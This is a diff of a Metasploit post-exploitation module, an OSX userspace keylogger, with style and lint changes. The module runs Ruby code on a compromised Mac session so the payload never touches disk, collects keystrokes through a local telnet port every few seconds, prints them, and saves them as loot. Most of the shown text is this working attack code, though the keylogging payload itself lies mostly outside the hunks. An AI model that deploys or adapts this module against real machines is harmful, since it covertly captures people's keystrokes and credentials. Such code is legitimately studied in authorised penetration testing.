@@ -1,3 +1,4 @@
+# frozen_string_literal: true
 ##
 # This module requires Metasploit: http://metasploit.com/download
 # Current source: https://github.com/rapid7/metasploit-framework
@@ -21,37 +22,32 @@ class MetasploitModule < Msf::Post
   # where we are storing the keylog
   attr_accessor :loot_path
 
-
-  def initialize(info={})
+  def initialize(info = {})
     super(update_info(info,
-      'Name'          => 'OSX Capture Userspace Keylogger',
-      'Description'   => %q{
-        Logs all keyboard events except cmd-keys and GUI password input.
+                      'Name'          => 'OSX Capture Userspace Keylogger',
+                      'Description'   => %q{
+                        Logs all keyboard events except cmd-keys and GUI password input.
 
-        Keylogs are transferred between client/server in chunks
-        every SYNCWAIT seconds for reliability.
+                        Keylogs are transferred between client/server in chunks
+                        every SYNCWAIT seconds for reliability.
 
-        Works by calling the Carbon GetKeys() hook using the DL lib
-        in OSX's system Ruby. The Ruby code is executed in a shell
-        command using -e, so the payload never hits the disk.
-      },
-      'License'       => MSF_LICENSE,
-      'Author'        => [ 'joev'],
-      'Platform'      => [ 'osx'],
-      'SessionTypes'  => [ 'shell', 'meterpreter' ]
-    ))
+                        Works by calling the Carbon GetKeys() hook using the DL lib
+                        in OSX's system Ruby. The Ruby code is executed in a shell
+                        command using -e, so the payload never hits the disk.
+                      },
+                      'License'       => MSF_LICENSE,
+                      'Author'        => [ 'joev'],
+                      'Platform'      => [ 'osx'],
+                      'SessionTypes'  => [ 'shell', 'meterpreter' ]))
 
     register_options(
       [
         OptInt.new('DURATION',
-          [ true, 'The duration in seconds.', 600 ]
-        ),
+                   [ true, 'The duration in seconds.', 600 ]),
         OptInt.new('SYNCWAIT',
-          [ true, 'The time between transferring log chunks.', 10 ]
-        ),
+                   [ true, 'The time between transferring log chunks.', 10 ]),
         OptPort.new('LOGPORT',
-          [ false, 'Local port opened for momentarily for log transfer', 22899 ]
-        )
+                    [ false, 'Local port opened for momentarily for log transfer', 22899 ])
       ]
     )
   end
@@ -59,8 +55,8 @@ class MetasploitModule < Msf::Post
   def run_ruby_code
     # to pass args to ruby -e we use ARGF (stdin) and yaml
     opts = {
-      :duration => datastore['DURATION'].to_i,
-      :port => self.port
+      duration: datastore['DURATION'].to_i,
+      port: port
     }
     cmd = ['ruby', '-e', ruby_code(opts)]
 
@@ -73,7 +69,6 @@ class MetasploitModule < Msf::Post
       fail_with(Failure::Unknown, "Ruby keylogger command failed with error #{rpid}")
     end
   end
-
 
   def run
     if session.nil?
@@ -92,36 +87,34 @@ class MetasploitModule < Msf::Post
     @pid = run_ruby_code
 
     begin
-      Timeout.timeout(datastore['DURATION']+5) do # padding to read the last logs
+      Timeout.timeout(datastore['DURATION'] + 5) do # padding to read the last logs
         print_status "Entering read loop"
-        while true
+        loop do
           print_status "Waiting #{datastore['SYNCWAIT']} seconds."
           Rex.sleep(datastore['SYNCWAIT'])
           print_status "Sending USR1 signal to open TCP port..."
-          cmd_exec("kill -USR1 #{self.pid}")
+          cmd_exec("kill -USR1 #{pid}")
           print_status "Dumping logs..."
-          log = cmd_exec("telnet localhost #{self.port}")
+          log = cmd_exec("telnet localhost #{port}")
           log_a = log.scan(/^\[.+?\] \[.+?\] .*$/)
-          log = log_a.join("\n")+"\n"
+          log = log_a.join("\n") + "\n"
           print_status "#{log_a.size} keystrokes captured"
-          if log_a.size > 0
-            if self.loot_path.nil?
-              self.loot_path = store_loot(
-                "keylog", "text/plain", session, log, "keylog.log", "OSX keylog"
-              )
-            else
-              File.open(self.loot_path, 'ab') { |f| f.write(log) }
-            end
-            print_status(log_a.map{ |a| a=~/([^\s]+)\s*$/; $1 }.join)
-            print_status "Saved to #{self.loot_path}"
+          next if log_a.empty?
+          if loot_path.nil?
+            self.loot_path = store_loot(
+              "keylog", "text/plain", session, log, "keylog.log", "OSX keylog"
+            )
+          else
+            File.open(loot_path, 'ab') { |f| f.write(log) }
           end
+          print_status(log_a.map { |a| a =~ /([^\s]+)\s*$/; Regexp.last_match(1) }.join)
+          print_status "Saved to #{loot_path}"
         end
       end
     rescue ::Timeout::Error
       print_status "Keylogger run completed."
     end
   end
-
 
   def kill_process(pid)
     print_status "Killing process #{pid.to_i}"
@@ -130,16 +123,16 @@ class MetasploitModule < Msf::Post
 
   def cleanup
     return if session.nil?
-    return if not @cleaning_up.nil?
+    return unless @cleaning_up.nil?
     @cleaning_up = true
 
-    if self.pid.to_i > 0
+    if pid.to_i > 0
       print_status("Cleaning up...")
-      kill_process(self.pid)
+      kill_process(pid)
     end
   end
 
-  def ruby_code(opts={})
+  def ruby_code(opts = {})
     <<-EOS
 # Kick off a child process and let parent die
 child_pid = fork do
@@ -293,4 +286,3 @@ Process.detach(child_pid)
 EOS
   end
 end
-
